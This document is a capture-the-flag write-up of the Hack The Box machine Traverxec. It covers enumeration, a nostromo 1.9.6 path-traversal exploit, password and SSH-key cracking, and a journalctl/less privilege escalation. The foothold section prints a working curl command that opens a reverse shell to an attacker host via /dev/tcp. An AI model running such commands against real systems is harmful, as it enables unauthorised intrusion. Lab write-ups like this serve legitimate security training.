---
title: "[HTB] Machine: Traverxec"
description: "[HTB] Machine: Traverxec"
date: 2023-06-26
menu:
  sidebar:
    name: "[HTB] Machine: Traverxec"
    identifier: htb-machine-traverxec
    parent: htb-machines-linux
    weight: 10
hero: images/traverxec.png
tags: ["HTB", "nostromo", "searchsploit", "htpasswd", "hashcat", "ssh", "john", "gtfobins", "journalctrl"]
---

# Traverxec
## Enumeration
- `nmap`
```
└─$ nmap -sC -sV -Pn 10.10.10.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST
Nmap scan report for 10.10.10.165 (10.10.10.165)
Host is up (0.096s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds
```
- Web server

![](./images/1.png)

- `gobuster`

```
└─$ gobuster dir -u http://10.10.10.165 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.165
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/27 19:39:09 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 314] [--> http://10.10.10.165/img/]
/icons                (Status: 301) [Size: 314] [--> http://10.10.10.165/icons/]
/css                  (Status: 301) [Size: 314] [--> http://10.10.10.165/css/]
/lib                  (Status: 301) [Size: 314] [--> http://10.10.10.165/lib/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.10.165/js/]
```

## Foothold
- From `nmap` results we see `nostromo 1.9.6`
  - Check `searchsploit`

![](./images/2.png)

![](./images/3.png)

- We can test `poc`

![](./images/4.png)

![](./images/5.png)

- It works
  - Let's get a reverse shell
  - `curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/6666 0>&1"'`

![](./images/6.png)

![](./images/7.png)

## User
- Let's enumerate with `linpeas`
  - Found `.htpasswd` and `nhttpd.conf`
  - Starts hashcat, since it will take a while to crack
    - `echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > david.hash`
    - `hashcat -m 500 david.hash /usr/share/wordlists/rockyou.txt --username`
    - Resulted in `david:Nowonly4me`
    - `su` doesn't work

![](./images/8.png)

![](./images/9.png)

- In `nhttpd.conf` we can see `homedirs` parameter set to `/home`
  - According to [docs](http://www.nazgul.ch/dev/nostromo_man.html), it means that 

![](./images/10.png)

- So we can visit `http://10.10.10.165/~david/`


![](./images/11.png)

- From the config file we also saw that `homedirs_public` is set to`public_www`
  - Which means that there is `public_www` folder inside `/home/david` which probably can be accessed as `www-data` user

![](./images/12.png)

- I tried sending file via `nc` but it didn't work
  - Then I tried downloading it using `wget` since we have creds for `david` and config states that it uses `.htpasswd` for authentification

![](./images/13.png)

- After downloading `tar` file, we see that it contains david's key
  - Which is protected, so let's crack it with `john`

![](./images/14.png)

- Let's connect using the key

![](./images/15.png)

## Root
- Let's enumerate for privesc again
  - We see `bin` folder with script inside

![](./images/16.png)

![](./images/17.png)

- We see that `journalctl` is executed as `sudo`
  - Thus `david` is a `sudoer`
  - Let's check `GTFOBins`
  
![](./images/18.png)

- So the trick here was that we need to shrink the terminal, so that `journalctl` will pipe stdout to `less`
  - Based on script we have 5 lines
  - We shrink terminal to less than 5
  - Output from the `journalctl` will be sent to `less` as root
  - And we can type `!/bin/bash` to get us a root shell

![](./images/19.png)

![](./images/20.png)
